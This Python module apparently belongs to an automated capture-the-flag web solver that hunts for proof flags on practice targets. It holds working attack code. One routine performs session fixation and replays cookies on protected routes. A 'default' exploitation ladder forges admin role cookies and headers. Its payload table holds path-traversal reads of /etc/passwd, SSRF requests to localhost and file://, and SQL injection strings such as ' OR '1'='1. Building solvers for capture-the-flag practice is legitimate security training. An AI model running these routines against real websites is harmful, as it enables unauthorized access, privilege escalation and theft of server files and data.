"""Per-vuln-class handlers for the generic web solver, plus the `default` general ladder (R1).

`for_key(key, clues)` returns the built-in handlers whose vuln class the clue KEY names (never the value -- the
documented pitfall). The caller (lib.web.candidates) always also races `default` and every earlier web day's
answer(), so coverage never depends on a key being recognised. Each handler takes (base_url, clues_dict) and returns
a proof_<hex> string or None. Hardened off-peak by hctf web-harden against free earlier-day Time Trial targets.
"""
import re
import secrets
import urllib.parse

from lib import websolve

SID_PARAMS = ("sid", "session_id", "session", "sessionid", "token", "PHPSESSID")

# clue KEY (regex) -> built-in handler name. The value in the clue is NEVER matched; only the key.
_KEY_MAP = [
    (r"sess|sid", "session_fixation"),
]


def for_key(key, clues):
    """Ordered (name, fn) built-in handlers whose class the clue key names."""
    out = []
    k = key or ""
    for pat, name in _KEY_MAP:
        if re.search(pat, k, re.I) and name in _HANDLERS:
            out.append((name, _HANDLERS[name]))
    return out


def _routes(clues, base):
    """Every path the kit names in /api/clues, plus links scraped from the home page as a fallback."""
    j = clues if isinstance(clues, dict) else {}
    routes = [v for v in j.values() if isinstance(v, str) and re.fullmatch(r"/[\w./-]+", v)]
    for v in j.values():
        if isinstance(v, list):
            routes += [x for x in v if isinstance(x, str) and x.startswith("/")]
    if not routes:
        _, home, _ = websolve.fetch(base)
        routes = [r for r in re.findall(r'href="(/[^"#?]+)"', home)
                  if not r.startswith(("/assets", "/api/clues"))]
    return list(dict.fromkeys(routes))


def session_fixation(base, clues):
    """Session fixation (lifted from the Day-21 session-impression solver): plant the hinted session id (or our own)
    via the planting route, then present it as the cookie on every protected route until the privileged session leaks
    the proof."""
    j = clues if isinstance(clues, dict) else {}
    routes = _routes(j, base)
    hint = next((v for k, v in j.items() if isinstance(v, str) and re.search(r"sess|sid|token", k, re.I)), None) \
        or secrets.token_hex(6)
    cookies, planted = [], set()
    for r in routes:
        url = urllib.parse.urljoin(base, r)
        _, body, _ = websolve.fetch(url)
        p = websolve.proof(body)
        if p:
            return p
        if not re.search(r"session|sid", body, re.I) or re.search(r"login|authenticat", body, re.I):
            continue
        for name in SID_PARAMS:
            _, body, sc = websolve.fetch(url + "?" + urllib.parse.urlencode({name: hint}))
            p = websolve.proof(body)
            if p:
                return p
            if "required" not in body:
                cookies += [c.split(";", 1)[0] for c in sc]
                planted.add(r)
                break
    cands = [c for c in cookies if c.split("=", 1)[-1] == hint] or cookies \
        or [f"{n}={hint}" for n in ("arena_session", "PHPSESSID", "session", "sid", "laravel_session")]
    for r in sorted(routes, key=lambda r: r in planted):   # protected (non-planting) routes first
        url = urllib.parse.urljoin(base, r)
        for c in cands:
            _, body, _ = websolve.fetch(url, {"Cookie": c})
            p = websolve.proof(body)
            if p:
                return p
    return None


_PARAM_PAYLOADS = {
    "id": ["1", "0", "2", "admin"],
    "user": ["admin", "0", "1"], "user_id": ["1", "0", "2"], "uid": ["1", "0"],
    "file": ["../../../../etc/passwd", "../app.py", "index.html"],
    "path": ["../../../../etc/passwd", "../app.py"], "page": ["../../../../etc/passwd"],
    "url": ["http://127.0.0.1/", "http://localhost/", "file:///etc/passwd"],
    "q": ["' OR '1'='1", "') OR ('1'='1", "1 OR 1=1"], "search": ["' OR '1'='1"],
    "name": ["' OR '1'='1"], "q2": ["' OR '1'='1"],
}
_PRIV_ROLES = ("admin", "administrator", "moderator", "root", "superuser")


def default(base, clues):
    """R1: general exploitation ladder for an unknown / unmatched clue key, driven ONLY by the invariant kit shape
    (named routes + current_role). Never fails to TRY -- it is the no-fail path for a never-seen class.
    Ladder: (1) GET every named route as-is; (2) role escalation (present privileged role cookies/headers);
    (3) parameter tampering (IDOR / LFI / SSRF / SQLi) on the named routes. First proof_<hex> wins."""
    j = clues if isinstance(clues, dict) else {}
    routes = _routes(j, base)

    # 1) every named route as the current role
    for r in routes:
        p = websolve.proof(websolve.fetch(urllib.parse.urljoin(base, r))[1])
        if p:
            return p

    # 2) role escalation: common ways the kit carries a role
    for role in _PRIV_ROLES:
        for hdrs in ({"Cookie": f"role={role}"}, {"Cookie": f"current_role={role}"},
                     {"X-Role": role}, {"Cookie": f"user={role}"}):
            for r in routes:
                p = websolve.proof(websolve.fetch(urllib.parse.urljoin(base, r), hdrs)[1])
                if p:
                    return p

    # 3) parameter tampering on each named route (IDOR / LFI / SSRF / SQLi)
    for r in routes:
        url = urllib.parse.urljoin(base, r)
        for param, vals in _PARAM_PAYLOADS.items():
            for v in vals:
                q = urllib.parse.urlencode({param: v})
                p = websolve.proof(websolve.fetch(f"{url}{'&' if '?' in url else '?'}{q}")[1])
                if p:
                    return p
    return None


_HANDLERS = {
    "session_fixation": session_fixation,
}
